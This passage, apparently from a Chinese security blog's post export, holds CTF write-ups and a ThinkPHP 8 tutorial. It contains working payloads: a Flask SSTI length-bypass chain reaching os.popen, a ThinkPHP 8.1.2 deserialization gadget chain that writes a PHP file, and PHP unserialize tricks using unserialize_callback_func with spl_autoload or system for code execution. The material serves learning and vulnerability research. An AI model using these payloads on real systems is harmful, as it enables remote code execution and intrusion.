json=payload)\nprint(r.text)\n```\n\n将静态文件的folder改成根目录，那么我们访问/static/其实里面显示的就是根目录下的内容\n\n所以我们访问/static/flag就可以拿到flag了\n\n# ezzz_ssti\n\n## #SSTI的长度绕过\n\n传入?user={{8*8}}就返回了\n\n![image-20250430162823807](../image/achieve/202411/DSBCTF单身杯/image-20250430162823807.png)\n\n但是fuzz了一下发现没有过滤，只是限制了长度，测了一下知道长度限制为40\n\n参考师傅的文章：https://blog.csdn.net/weixin_43995419/article/details/126811287\n\n简单来说就是Flask 框架中存在`config`全局对象，用来保存配置信息。`config` 对象实质上是一个字典的子类，可以像字典一样操作，而`update`方法又可以更新python中的字典。我们就可以利用 Jinja 模板的 `set` 语句配合字典的 `update()` 方法来更新 `config` 全局对象，将字典中的`lipsum.__globals__`更新为`g`，就可以达到在 `config` 全局对象中分段保存 `Payload`，从而绕过长度限制。\n\n```\n{%set x=config.update(a=config.update)%}   //此时字典中a的值被更新为config全局对象中的update方法\n{%set x=config.a(f=lipsum.__globals__)%}   //f的值被更新为lipsum.__globals__\n{%set x=config.a(o=config.f.os)%}          //o的值被更新为lipsum.__globals__.os\n{%set x=config.a(p=config.o.popen)%}       //p的值被更新为lipsum.__globals__.os.popen\n{{config.p(\"cat /t*\").read()}}     \n```\n\n![image-20250430171444703](../image/achieve/202411/DSBCTF单身杯/image-20250430171444703.png)\n","tags":["DSBCTF"],"categories":["ctfshow"]},{"title":"ThinkPHP8同步学习","url":"/2025/04/28/ThinkPHP8同步学习/","content":"\n# 0x01前言\n\n这篇文章是为了我之前丢弃的tp学习而重新写的，因为最近刚好在复现tp的反序列化的漏洞，所以干脆把tp也学一下\n\n# 0x02关于ThinkPHP\n\n这次也是参考的官方文档去进行学习的\n\n官方文档：[序言 - ThinkPHP8.0官方手册](https://doc.thinkphp.cn/v8_0/preface.html)\n\n## 什么是ThinkPHP？\n\n`ThinkPHP`是一个免费开源的，快速、简单的面向对象的**轻量级PHP开发框架**，是为了敏捷WEB应用开发和简化企业应用开发而诞生的\n\n## **ThinkPHP 的特点**\n\n- **简单易用**：ThinkPHP 的设计理念是“大道至简”，提供了直观的 API 和文档，适合初学者和高级开发者。\n\n- **高性能**：框架经过优化，运行效率高，适合处理高并发场景。\n\n- **模块化设计**：支持模块化开发，方便项目的组织和扩展。\n\n- 丰富的功能\n\n  - 数据库操作（支持多种数据库，如 MySQL、PostgreSQL、SQLite 等）。\n  - 路由系统（支持 RESTful 路由）。\n  - 模板引擎（内置模板引擎，支持视图渲染）。\n  - 缓存机制（支持多种缓存方式，如文件缓存、Redis、Memcached 等）。\n  - 安全性（提供 CSRF 防护、XSS 过滤等安全机制）。\n\n- **跨平台**：支持 Windows、Linux、macOS 等操作系统。\n\n- **社区活跃**：拥有庞大的中文开发者社区，文档和教程丰富。\n\n# 0x03版本安装\n\n## 环境要求\n\n```\nPHP >= 8.0.0\n```\n\n## 安装 Composer\n\nComposer 是一个 PHP 工具，因此需要先安装 PHP。这里方法我就不讲了，直接说Composer的安装\n\n- 下载 Composer 安装脚本\n\n```\nphp -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"\n```\n\n- 验证安装脚本\n\n```\nphp -r \"echo hash_file('sha384', 'composer-setup.php');\"\n```\n\n然后与 [官方哈希值](https://composer.github.io/pubkeys.html) 进行对比。如果一致，说明脚本是安全的。\n\n![image-20250428113350350](../image/achieve/202411/ThinkPHP8学习/image-20250428113350350.png)\n\n![image-20250428113458379](../image/achieve/202411/ThinkPHP8学习/image-20250428113458379.png)\n\n- 安装Composer\n\n```\nphp composer-setup.php --install-dir=/usr/local/bin --filename=composer\n```\n\n1. `--install-dir=/usr/local/bin`：将 Composer 安装到 `/usr/local/bin` 目录，这样可以在全局范围内使用。\n2. `--filename=composer`：将可执行文件命名为 `composer`。\n\n![image-20250428113545321](../image/achieve/202411/ThinkPHP8学习/image-20250428113545321.png)\n\n- 验证安装\n\n```\ncomposer --version\n```\n\n![image-20250428113646668](../image/achieve/202411/ThinkPHP8学习/image-20250428113646668.png)\n\n如果看到类似 `Composer version 2.x.x` 的输出，说明安装成功。\n\n这里的话因为我是用root的身份去执行命令的，Composer认为以 root 用户运行 Composer 可能导致项目文件的所有权变为 root，这会影响后续的开发和部署，所以会发出警告，其实我们暂时可以不用管，毕竟只是安装过程\n\n- 删除安装脚本\n\n```\nphp -r \"unlink('composer-setup.php');\"\n```\n\n至此Composer就安装好了，然后我们安装ThinkPHP\n\n## 安装ThinkPHP\n\n因为我同时也在复现tp8.1.2的反序列化漏洞，所以这里直接用同版本去学习了\n\n在命令行下面，切换到你的WEB根目录下面并执行\n\n```\ncomposer create-project topthink/think=8.0.3 tp\n```\n\n- `topthink/think`：ThinkPHP 的 Composer 包名称。\n- `8.1.2`：指定安装的版本。\n- `tp`：项目目录名称，可以自定义。\n\n![image-20250428114359841](../image/achieve/202411/ThinkPHP8学习/image-20250428114359841.png)\n\n```\ncd tp\nphp think run\n```\n\n![image-20250428114644949](../image/achieve/202411/ThinkPHP8学习/image-20250428114644949.png)\n\n然后我们访问8000端口，因为是0.0.0.0，我直接访问的vps的公网ip也是可以的\n\n![image-20250428114745635](../image/achieve/202411/ThinkPHP8学习/image-20250428114745635.png)\n\n安装成功\n\n# 0x04基础知识\n\n## 命名规范\n\n`ThinkPHP8.0`遵循`PSR-2`命名规范和`PSR-4`自动加载规范，并且注意如下规范：\n\n目录和文件\n\n- 目录使用小写+下划线；\n- 类库、函数文件统一以`.php`为后缀；\n- 类的文件名均以命名空间定义，并且命名空间的路径和类库文件所在路径一致；\n- 类（包含接口和Trait）文件采用驼峰法命名（首字母大写），其它文件采用小写+下划线命名；\n- 类名（包括接口和Trait）和文件名保持一致，统一采用驼峰法命名（首字母大写）；\n\n函数和类、属性命名\n\n- 类的命名采用驼峰法（首字母大写），例如 `User`、`UserType`；\n- 函数的命名使用小写字母和下划线（小写字母开头）的方式，例如 `get_client_ip`；\n- 方法的命名使用驼峰法（首字母小写），例如 `getUserName`；\n- 属性的命名使用驼峰法（首字母小写），例如 `tableName`、`instance`；\n- 特例：以双下划线`__`打头的函数或方法作为魔术方法，例如 `__call` 和 `__autoload`；\n\n常量和配置\n\n- 常量以大写字母和下划线命名，例如 `APP_PATH`；\n- 配置参数以小写字母和下划线命名，例如 `url_route_on` 和`url_convert`；\n- 环境变量定义使用大写字母和下划线命名，例如`APP_DEBUG`；\n\n数据表和字段\n\n- 数据表和字段采用小写加下划线方式命名，并注意字段名不要以下划线开头，例如 `think_user` 表和 `user_name`字段，不建议使用驼峰和中文作为数据表及字段命名。\n\n需要注意的是我们需要尽量避免使用PHP的保留字，否则会出现错误\n\n## 目录结构\n\n我们看看官方给出的目录结构是什么样的\n\n单应用模式\n\n默认安装后的目录结构就是一个单应用模式\n\n```\nwww  WEB部署目录（或者子目录）\n├─app           应用目录\n│  ├─controller      控制器目录\n│  ├─model           模型目录\n│  ├─ ...            更多类库目录\n│  │\n│  ├─common.php         公共函数文件\n│  └─event.php          事件定义文件\n│\n├─config                配置目录\n│  ├─app.php            应用配置\n│  ├─cache.php          缓存配置\n│  ├─console.php        控制台配置\n│  ├─cookie.php         Cookie配置\n│  ├─database.php       数据库配置\n│  ├─filesystem.php     文件磁盘配置\n│  ├─lang.php           多语言配置\n│  ├─log.php            日志配置\n│  ├─middleware.php     中间件配置\n│  ├─route.php          URL和路由配置\n│  ├─session.php        Session配置\n│  ├─trace.php          Trace配置\n│  └─view.php           视图配置\n│\n├─view            视图目录\n├─route                 路由定义目录\n│  ├─route.php          路由定义文件\n│  └─ ...   \n│\n├─public                WEB目录（对外访问目录）\n│  ├─index.php          入口文件\n│  ├─router.php         快速测试文件\n│  └─.htaccess          用于apache的重写\n│\n├─extend                扩展类库目录\n├─runtime               应用的运行时目录（可写，可定制）\n├─vendor                Composer类库目录\n├─.example.env          环境变量示例文件\n├─composer.json         composer 定义文件\n├─LICENSE.txt           授权说明文件\n├─README.md             README 文件\n├─think                 命令行入口文件\n```\n\n**在实际的部署中，请确保只有`public`目录可以对外访问。**\n\n然后我们看一下当前的目录结构是什么样的\n\n主目录\n\n![image-20250428140007083](../image/achieve/202411/ThinkPHP8学习/image-20250428140007083.png)\n\n子目录\n\n![image-20250428140046670](../image/achieve/202411/ACTF2025/image-20250428140046670.png)\n\n![image-20250428140125205](../image/achieve/202411/ACTF2025/image-20250428140125205.png)\n\n### app应用目录\n\n默认情况下的app目录下的文件结构是\n\n```\n├─app           应用目录\n│  │\n│  ├─BaseController.php    默认基础控制器类\n│  ├─ExceptionHandle.php   应用异常定义文件\n│  ├─common.php            全局公共函数文件\n│  ├─middleware.php        全局中间件定义文件\n│  ├─provider.php          服务提供定义文件\n│  ├─Request.php           应用请求对象\n│  └─event.php             全局事件定义文件\n```\n\n#### config配置目录\n\n```\n├─config（配置目录）\n│  ├─app.php            应用配置\n│  ├─cache.php          缓存配置\n│  ├─console.php        控制台配置\n│  ├─cookie.php         Cookie配置\n│  ├─database.php       数据库配置\n│  ├─filesystem.php     文件磁盘配置\n│  ├─lang.php           多语言配置\n│  ├─log.php            日志配置\n│  ├─middleware.php     中间件配置\n│  ├─route.php          URL和路由配置\n│  ├─session.php        Session配置\n│  ├─trace.php          Trace配置\n│  ├─view.php           视图配置\n│  └─ ...               更多配置文件\n│  \n```\n\n对于单应用模式来说，配置文件和目录很简单，根目录下的`config`目录下面就是所有的配置文件。\n\n## 路由\n\n要使用`Route`类注册路由必须首先在路由定义文件开头添加引用，我们这里拿初始的分析下\n\n```php\n<?php\n// +----------------------------------------------------------------------\n// | ThinkPHP [ WE CAN DO IT JUST THINK ]\n// +----------------------------------------------------------------------\n// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.\n// +----------------------------------------------------------------------\n// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )\n// +----------------------------------------------------------------------\n// | Author: liu21st <liu21st@gmail.com>\n// +----------------------------------------------------------------------\nuse think\\facade\\Route;\n\nRoute::get('think', function () {\n    return 'hello,ThinkPHP8!';\n});\n\nRoute::get('hello/:name', 'index/hello');\n\n```\n\n例如我们访问/hello/1，页面返回\n\n```\nhello,1\n```\n\n这是为什么呢？`index/hello` 是路由指向的控制器方法，表示调用 `index` 控制器中的 `hello` 方法。那我们跟进一下这个hello方法\n\n```php\npublic function hello($name = 'ThinkPHP8')\n    {\n        return 'hello,' . $name;\n    }\n```\n\n可以看到这里会返回hello加上name参数的值\n\n最基础的路由定义方法是：\n\n```\nRoute::rule('路由表达式', '路由地址', '请求类型');\n```\n\n可以在`rule`方法中指定请求类型（不指定的话默认为任何请求类型有效）\n\n例如我们设置\n\n```php\nRoute::rule('new/:id', 'Test/test', 'GET');\n```\n\n```php\n<?php\n// +----------------------------------------------------------------------\n// | ThinkPHP [ WE CAN DO IT JUST THINK ]\n// +----------------------------------------------------------------------\n// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.\n// +----------------------------------------------------------------------\n// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )\n// +----------------------------------------------------------------------\n// | Author: liu21st <liu21st@gmail.com>\n// +----------------------------------------------------------------------\nuse think\\facade\\Route;\n\nRoute::get('think', function () {\n    return 'hello,ThinkPHP8!';\n});\n\nRoute::get('hello/:name', 'index/hello');\n\nRoute::rule('new/:id', 'Test/test', 'GET');\n\n```\n\n然后访我们自己写一个Test控制器\n\n```php\n<?php \nnamespace app\\controller;\n\nuse app\\BaseController;\n\nclass Test extends BaseController\n{\n        public function test($id)\n        {\n                return 'hello, ' . $id;\n        }\n}\n```\n\n写好后访问/new/1\n\n![image-20250428144405596](../image/achieve/202411/ThinkPHP8学习/image-20250428144405596.png)\n\n这样看就是成功了\n\n另外我们还有一种快捷注册方法的用法\n\n```\nRoute::快捷方法名('路由表达式', '路由地址');\n```\n\n例子就是原来里面的\n\n```php\nRoute::get('hello/:name', 'index/hello');\n实例\nRoute::get('new/<id>','News/read'); // 定义GET请求路由规则\nRoute::post('new/<id>','News/update'); // 定义POST请求路由规则\nRoute::put('new/<id>','News/update'); // 定义PUT请求路由规则\nRoute::delete('new/<id>','News/delete'); // 定义DELETE请求路由规则\nRoute::any('new/<id>','News/read'); // 所有请求都支持的路由规则\n```\n\n不过规则也分为静态规则和动态规则\n\n```\nRoute::rule('my', 'Member/myinfo'); // 静态地址路由\nRoute::rule('<blog>/<id>', 'Blog/read'); // 动态地址路由\nRoute::rule('new/<year>/<month>/<day>', 'News/read'); // 静态地址和动态地址结合\n```\n\n### 动态变量\n\n每个参数中可以包括动态变量，例如`:变量`或者`<变量>`都表示动态变量（推荐使用第二种方式，更利于混合变量定义），并且会自动绑定到操作方法的对应参数。\n\n### 可选变量\n\n支持对路由参数的可选定义\n\n```\nRoute::rule('new/[:id]', 'Test/test', 'GET');\n```\n\n变量用`[ ]`包含起来后就表示该变量是路由匹配的可选变量。\n\n因此我们可以对变量设置默认值，当未传入参数的时候则会使用默认值\n\n```php\n<?php \nnamespace app\\controller;\n\nuse app\\BaseController;\n\nclass Test extends BaseController\n{\n        public function test($id = 'wanth3f1ag')\n        {\n                return 'hello, ' . $id;\n        }\n}\n```\n\n![image-20250428145430881](../image/achieve/202411/ThinkPHP8学习/image-20250428145430881.png)\n\n要注意的是：可选参数只能放到路由规则的最后，如果在中间使用了可选参数的话，后面的变量都会变成可选参数。\n\n可变变量最大的好处就是，采用可选变量定义后，之前需要定义两个或者多个路由规则才能处理的情况可以合并为一个路由规则。\n\n```\nRoute::get('blog/:year/[:month]','Blog/archive');\n// 或者\nRoute::get('blog/<year>/<month?>','Blog/archive');\n```\n\n此时可以根据可选变量的值的有无进行不同的处理\n\n### 完全匹配变量\n\n同样的路由\n\n![image-20250428145715613](../image/achieve/202411/ThinkPHP8学习/image-20250428145715613.png)\n\n可以发现，规则匹配检测的时候默认只是对URL从头开始匹配，只要URL地址开头包含了定义的路由规则就会匹配成功，如果希望URL进行完全匹配，可以在路由表达式最后使用`$`符号\n\n```\nRoute::rule('new/:id$', 'Test/test', 'GET');\n```\n\n![image-20250428150100031](../image/achieve/202411/ThinkPHP8学习/image-20250428150100031.png)\n\n另外，官方给出了全局配置路由访问的方法\n\n![image-20250428150350594](../image/achieve/202411/ThinkPHP8学习/image-20250428150350594.png)\n\n### 额外参数\n\n在路由跳转的时候支持额外传入参数对（额外参数指的是不在URL里面的参数，隐式传入需要的操作中，有时候能够起到一定的安全防护作用）\n\n例如\n\n```php\nRoute::get('blog/:id','blog/read')\n    ->append(['status' => 1, 'app_id' =>5]);\n```\n\n此时我们url传入id的值之后，在跳转调用的时候会带入status=1和app_id=5两个参数\n\n### 变量规则\n\n![image-20250428150706663](../image/achieve/202411/ThinkPHP8学习/image-20250428150706663.png)\n\n系统默认的变量规则设置是`[\\w\\.]+`，意思是可以匹配任意数字，字母，下划线和小数点，而不会匹配其他特殊字符\n\n![image-20250428151810376](../image/achieve/202411/ThinkPHP8学习/image-20250428151810376.png)\n\n#### 局部变量规则\n\n如果我们有特别的变量规则的话，可以手动添加\n\n例如\n\n```\n// 定义GET请求路由规则 并设置name变量规则\nRoute::get('new/:id', 'Test/test')\n    ->pattern(['id' => '[\\w\\-]+']);\n```\n\n![image-20250428152229999](../image/achieve/202411/ThinkPHP8学习/image-20250428152229999.png)\n\n之前的规则已经失效了\n\n![image-20250428152256781](../image/achieve/202411/ThinkPHP8学习/image-20250428152256781.png)\n\n新的局部变量规则生效\n\n#### 全局变量规则\n\n![image-20250428152725082](../image/achieve/202411/ThinkPHP8学习/image-20250428152725082.png)\n\n### 动态路由\n\n前面讲过动态地址，但是这里还有一个动态路由\n\n可以把路由规则中的变量传入路由地址中，就可以实现一个动态路由\n\n```\n// 定义动态路由\nRoute::get('hello/:name', 'index/:name');\n```\n\n这里会根据name的值去动态选择index下的方法\n\n举例子测试一下\n\n```php\n<?php\nnamespace app\\controller;\n\nuse app\\BaseController;\n\nclass Test extends BaseController\n{\n        public function t1($id = 'wanth3f1ag')\n        {\n                return 'This is No. ' . $id . ' test';\n        }\n        public function t2($id = 'vu1n4bly')\n        {\n                return 'This is No.'. $id .' test2 ';\n        }\n}\n```\n\n```php\nRoute::rule('new/[:id]', 'Test/:id', 'GET');\n```\n\n### 路由地址\n\n路由地址表示定义的路由表达式最终需要路由到的实际地址（或者响应对象）以及一些需要的额外参数，支持下面几种方式定义\n\n#### 路由到控制器/操作\n\n这是最常用的一种了，我们上面用的也是这种，把满足条件的路由规则路由到相关的控制器和操作，然后由系统调度执行相关的操作\n\n格式\n\n```\n模块/控制器/操作\n```\n\n例如我们刚刚说的\n\n```\nRoute::rule('new/:id$', 'Test/test', 'GET');\n```\n\n这里就是从路由到Test控制器\n\n#### 路由到类的方法\n\n这种方式的路由可以支持执行任何类的方法，而不局限于执行控制器的操作方法。\n\n路由地址的格式为（动态方法）：\n\n> \\完整类名@方法名 或 [ 完整类名, 方法名 ]\n\n或者（静态方法）\n\n> \\完整类名::方法名\n\n### 路由参数\n\n","tags":["ThinkPHP8"],"categories":["框架学习"]},{"title":"PHP反序列化-ThinkPHP8.1.x框架","url":"/2025/04/28/PHP反序列化-ThinkPHP8.1.2框架/","content":"\n# ThinkPHP是什么\n\nThinkPHP是 是一个快速、简洁、轻量级的 PHP 开发框架，由中国开发者团队开发和维护。它旨在简化 PHP 应用程序的开发流程，提供丰富的功能和工具，帮助开发者高效构建 Web 应用程序、API 服务等。\n\n**ThinkPHP 的特点**\n\n- **简单易用**：ThinkPHP 的设计理念是“大道至简”，提供了直观的 API 和文档，适合初学者和高级开发者。\n\n- **高性能**：框架经过优化，运行效率高，适合处理高并发场景。\n\n- **模块化设计**：支持模块化开发，方便项目的组织和扩展。\n\n- 丰富的功能\n\n  - 数据库操作（支持多种数据库，如 MySQL、PostgreSQL、SQLite 等）。\n  - 路由系统（支持 RESTful 路由）。\n  - 模板引擎（内置模板引擎，支持视图渲染）。\n  - 缓存机制（支持多种缓存方式，如文件缓存、Redis、Memcached 等）。\n  - 安全性（提供 CSRF 防护、XSS 过滤等安全机制）。\n  \n- **跨平台**：支持 Windows、Linux、macOS 等操作系统。\n\n- **社区活跃**：拥有庞大的中文开发者社区，文档和教程丰富。\n\n而**ThinkPHP (8.1.2)**是官方在2025年1月发布的改进版本，现被发现存在反序列化漏洞，然后我这里跟着文章去复现一下\n\n参考文章：[最新版 ThinkPHP (8.1.2) 反序列化漏洞挖掘](https://mp.weixin.qq.com/s/zc7grAdxulFir0Q4qUT3ww)\n\n# 环境搭建\n\n既然是8.1.2的版本出现的漏洞，那么肯定需要拉源码下来分析了\n\n当前PHP版本：8.1.2\n\nThinkPHP 版本: 8.1.2, 官网 Github: https://github.com/top-think/framework/releases/tag/v8.1.2, 这里使用`composer`进行安装即可\n\n```\ncomposer create-project topthink/think=8.1.2 my-project\n```\n\n- `topthink/think`：ThinkPHP 的 Composer 包名称。\n- `8.1.2`：指定安装的版本。\n- `my-project`：项目目录名称，可以自定义。\n\n我是在vps的web目录下安装的，安装完成后直接访问就行\n\n![image-20250428111606168](../image/achieve/202411/CVE复现/image-20250428111606168.png)\n\n然后在Windows物理机拉一下源码然后放phpstorm进行分析\n\n先看看大致的目录内容\n\n![image-20250428111857012](../image/achieve/202411/CVE复现/image-20250428111857012.png)\n\n随后我们创建`\\app\\controller\\Wang.php`文件, 内容如下（当作控制器）\n\n```php\n<?php\n\nnamespace app\\controller;\n\nuse app\\BaseController;\n\nclass Wang extends BaseController{\n    public function index(){\n        $data = isset($_REQUEST['data']) ? $_REQUEST['data'] : '';\n        if(isset($data) && $data != ''){\n            unserialize($data);\n        }else {\n            echo 'no data';\n        }\n        return '<br>ThinkPHP Test';\n    }\n}\n```\n\n然后我们访问index方法\n\n![image-20250428163030271](../image/achieve/202411/CVE复现/image-20250428163030271.png)\n\n# 漏洞分析\n\n## 任意文件读写\n\n既然需要触发反序列化，那么就需要一个能触发的口子，也就是__destruct方法，所以我们全局搜索`__destruct`\n\n![image-20250428163324006](../image/achieve/202411/CVE复现/image-20250428163324006.png)\n\n发现`vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache`这个类存在一个`save`方法调用, 但它是抽象类, 不允许反序列化, 我们找一下它的子类中的save方法\n\n```php\n    public function save()\n    {\n        $config = new Config();\n        $contents = $this->getForStorage();\n\n        if ($this->adapter->has($this->file)) {\n            $this->adapter->update($this->file, $contents, $config);\n        } else {\n            $this->adapter->write($this->file, $contents, $config);\n        }\n    }\n```\n\n在107行用了getForStorage()方法\n\n```php\npublic function getForStorage()\n{\n    $cleaned = $this->cleanContents($this->cache);\n\n    return json_encode([$cleaned, $this->complete, $this->expire]);\n}\n```\n\n```php\n//cleanContents方法\npublic function cleanContents(array $contents)\n{\n    $cachedProperties = array_flip([\n        'path', 'dirname', 'basename', 'extension', 'filename',\n        'size', 'mimetype', 'visibility', 'timestamp', 'type',\n        'md5',\n    ]);\n\n    foreach ($contents as $path => $object) {\n        if (is_array($object)) {\n            $contents[$path] = array_intersect_key($object, $cachedProperties);\n        }\n    }\n\n    return $contents;\n}\n```\n\n分析一下代码\n\n在getForStorage方法中，会对内容进行一定的清理，并返回一个json串，而成员属性是可控的, 所以这里`$contents`的最终结果是部分可控的, 因为返回了一个具体的`JSON`串.\n\n然后继续看save方法，有write调用，大致意思就是如果文件存在则update更新文件的内容，不存在则写入文件\n\n由于`write`方法名就像是写入文件操作, 所以这里全局搜索`write`方法的定义, 看一下是否存在一些文件写入等功能模块的调用\n\n在vendor/league/flysystem/src/Adapter/Local.php中有write的方法，并且在原来的调用中可以看到这个write的第一个参数和第二个参数是可控的，而第三个参数是`$config = new Config();`\n\n```php\npublic function write($path, $contents, Config $config)\n    {\n        $location = $this->applyPathPrefix($path);\n        $this->ensureDirectory(dirname($location));\n\n        if (($size = file_put_contents($location, $contents, $this->writeFlags)) === false) {\n            return false;\n        }\n\n        $type = 'file';\n        $result = compact('contents', 'type', 'size', 'path');\n\n        if ($visibility = $config->get('visibility')) {\n            $result['visibility'] = $visibility;\n            $this->setVisibility($path, $visibility);\n        }\n\n        return $result;\n    }\n```\n\n这里存在一个文件写入操作，那我们尝试着去写链子\n\n```\nvendor/league/flysystem-cached-adapter/src/Storage/AbstractCache::__destruct->vendor/League\\Flysystem\\Cached\\Storage\\Adapter::save->vendor/league/flysystem/src/Adapter/Local::write\n```\n\n那我们的poc就是\n\n```php\n<?php\n\nnamespace League\\Flysystem\\Adapter {\n    class Local {\n\n    }\n}\n\nnamespace League\\Flysystem\\Cached\\Storage {\n    class AbstractCache {\n        protected $autosave = false;\n    }\n\n    class Adapter extends AbstractCache {\n        protected $file = './test.php';\n        protected $cache = ['<?=phpinfo();?>'];\n        protected $adapter;\n    }\n}\n\nnamespace {\n    $obj = new League\\Flysystem\\Cached\\Storage\\Adapter();\n    $obj -> $adapter = new \\League\\Flysystem\\Adapter\\Local();\n    echo urlencode(serialize($obj));\n}\n\n```\n\n把poc写在public目录下，因为在public目录下的文件才能对外访问到\n\n我们访问poc.php\n\n![image-20250428183332789](../image/achieve/202411/ThinkPHP8学习/image-20250428183332789.png)\n","tags":["TP8"],"categories":["PHP反序列化"]},{"title":"ctfshow大牛杯","url":"/2025/04/27/ctfshow大牛杯/","content":"\n# easy_unserialize\n\n```php\n<?php\nhighlight_file(__FILE__);\nclass main{\n    public $settings;\n    public $params;\n\n    public function __construct(){\n        $this->settings=array(\n        'display_errors'=>'On',\n        'allow_url_fopen'=>'On'\n        );\n        $this->params=array();\n    }\n    public function __wakeup(){\n        foreach ($this->settings as $key => $value) {\n            ini_set($key, $value);\n        }\n    }\n\n    public function __destruct(){\n        file_put_contents('settings.inc', unserialize($this->params));\n    }\n}\n\nunserialize($_GET['data']);\n\nNotice: Undefined index: data in /var/www/html/index.php on line 39\n```\n\n这里的话在反序列化的时候触发wakeup方法，通过ini_set函数去动态设置PHP的ini配置，而这个设置的内容就是我们设置的settings的键值对，并且在对象销毁的时候会将params的值反序列化后写入settings.inc文件\n\n通过ini_set设定配置选项，那我们可利用`unserialize_callback_func`\n\n## unserialize_callback_func配置\n\n![image-20250424112705042](../image/achieve/202411/大牛杯/image-20250424112705042.png)\n\n当unserialize()尝试使用未定义的类 时，会调用指定的类的回调函数 。如果指定的回调函数未定义，或者回调函数未能定义缺失的类，则会显示警告。\n\n简单来说，\n\n在 PHP 中，反序列化（`unserialize`）时，如果遇到未定义的类，默认行为是抛出一个警告（`Warning`）并继续执行。\n\n- **`unserialize_callback_func`** 允许你指定一个回调函数，当遇到未定义类时，PHP 会调用该回调函数来尝试加载类。\n\n然后我们再看看另一个spl_autoload\n\n## spl_autoload()函数\n\n![image-20250424113441538](../image/achieve/202411/陇剑杯2023/image-20250424113441538.png)\n\n然后我们跟进autoload()函数的实现\n\n![image-20250424115853942](../image/achieve/202411/大牛杯/image-20250424115853942.png)\n\n所以我们可以知道，这里会尝试加载未定的类，然后`spl_autoload` 会尝试加载与类名同名的 `.php` 或 `.inc` 文件。这里就是突破口\n\n先给payload再讲讲思路吧\n\n```php\n<?php\nclass main{\n    public $settings;\n    public $params;\n\n    public function __construct(){\n        $this->settings = array(\n            'unserialize_callback_func' => 'spl_autoload'\n        );\n        $this->params = serialize('<?php phpinfo();?>');\n    }\n}\n$a = new main();\necho urlencode(serialize($a));\n```\n\n将输出结果传入data参数\n\n这里的话我们通过ini_set将unseralize_callback_func配置设置为回调函数spl_autoload，并将`<?php phpinfo();?>`写入setting.inc中\n\n```php\n<?php\nclass settings{\n\n}\nclass main{\n    public $settings;\n    public $params;\n\n    public function __construct(){\n        $this->settings = array(\n            'unserialize_callback_func' => 'spl_autoload'\n        );\n        $this->params = serialize(new settings());\n    }\n}\n$a = new main();\necho urlencode(serialize($a));\n```\n\n这里我们设置params为一个settings类的实例化对象，将输出结果传入后发现\n\n![image-20250424115013697](../image/achieve/202411/大牛杯/image-20250424115013697.png)\n\n我们刚刚设置的代码被成功执行了，这是为什么呢？\n\n首先我们知道，我们第一个payload中将unseralize_callback_func设置为一个回调函数spl_autoload，并将我们的恶意代码（例如`<?php phpinfo();?>`）写入settings.inc中，之后我们第二个payload就是关键，我们将param设置为一个未定义的类settings，在传入data的时候data经过unseralize函数反序列化后，在对象销毁的时候触发file_put_contents函数中的unseralize，此时我们的settings类是未定义的，`spl_autoload` 会根据类名尝试加载对应的文件，例如settings.inc或者settings.php，那么此时就会包含此文件，包含的话就会执行里面的php代码\n\n测试成功了直接打就行\n\n当然我们这里也可以用更简单的方法\n\n```php\n<?php\nclass main{\n    public $settings;\n    public $params;\n\n    public function __construct(){\n        $this->settings=array(\n        'unserialize_callback_func'=>'system',\n        );\n        $this->params='O:2:\"ls\":0:{}';      \n    }\n}\n$a=new main();\necho serialize($a);\n```\n\n这里的话就是反序列化后是未定义的类，然后就会调用指定的函数，函数的参数就是反序列化的类名\n\n# web_checkin\n\n## #内联执行+短标签+nl的特性\n\n```php\n<?php\nerror_reporting(0);\ninclude \"config.php\";\n//flag in /\n\nfunction check_letter($code){\n    $letter_blacklist = str_split(\"abcdefghijklmnopqrstuvwxyz1234567890\");\n    for ($i = 0; $i < count($letter_blacklist); $i+=2){\n        if (preg_match(\"/\".$letter_blacklist[$i].\"/i\", $code)){\n            die(\"xi nei~\");\n        }\n    }\n}\n\nfunction check_character($code){\n    $character_blacklist = array('=','\\+','%','_','\\)','\\(','\\*','&','\\^','-','\\$','#','`','@','!','~','\\]','\\[','}','{','\\'','\\\"',';',' ','\\/','\\.','\\?',',','<',':','>');\n    for ($i = 1; $i < count($character_blacklist); $i+=2){\n        if (preg_match(\"/\".$character_blacklist[$i].\"/\", $code)){\n            die(\"tongtong xi nei~\");\n        }\n    }\n}\n\n$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';\nif (!file_exists($dir)) {\n    mkdir($dir);\n}\nif (isset($_GET[\"code\"])) {\n    $code = substr($_GET[\"code\"], 0, 12);\n    check_letter($code);\n    check_character($code);\n\n    file_put_contents(\"$dir\" . \"index.php\", \"<?php \".$code.$fuxkfile);\n    echo $dir;\n}else{\n    highlight_file(__FILE__);\n}\n```\n\nflag在根目录\n\n代码分块分析一下\n\n```php\nfunction check_letter($code){\n    $letter_blacklist = str_split(\"abcdefghijklmnopqrstuvwxyz1234567890\");\n    for ($i = 0; $i < count($letter_blacklist); $i+=2){\n        if (preg_match(\"/\".$letter_blacklist[$i].\"/i\", $code)){\n            die(\"xi nei~\");\n        }\n    }\n}\n```\n\n过滤了一些字符，可以写个脚本看一下\n\n```php\n<?php\n$letter_blacklist = str_split(\"abcdefghijklmnopqrstuvwxyz1234567890\");\nfor($i = 0; $i < count($letter_blacklist); $i+=2){\n    echo $letter_blacklist[$i];\n}\n//acegikmoqsuwy13579\n```\n\n过滤了部分字母数字（源代码中有/i模式同样过滤了同样的大写字母）\n\n```php\nfunction check_character($code){\n    $character_blacklist = array('=','\\+','%','_','\\)','\\(','\\*','&','\\^','-','\\$','#','`','@','!','~','\\]','\\[','}','{','\\'','\\\"',';',' ','\\/','\\.','\\?',',','<',':','>');\n    for ($i = 1; $i < count($character_blacklist); $i+=2){\n        if (preg_match(\"/\".$character_blacklist[$i].\"/\", $code)){\n            die(\"tongtong xi nei~\");\n        }\n    }\n}\n```\n\n同样写个脚本\n\n```php\n<?php\n$character_blacklist = array('=','\\+','%','_','\\)','\\(','\\*','&','\\^','-','\\$','#','`','@','!','~','\\]','\\[','}','{','\\'','\\\"',';',' ','\\/','\\.','\\?',',','<',':','>');\nfor($i = 0; $i < count($character_blacklist); $i+=2){\n    echo $character_blacklist[$i];\n}\n//%\\)\\*\\^\\$`!\\]}';\\/\\?<>\n```\n\n继续往下看\n\n```php\n$dir = 'sandbox/' . 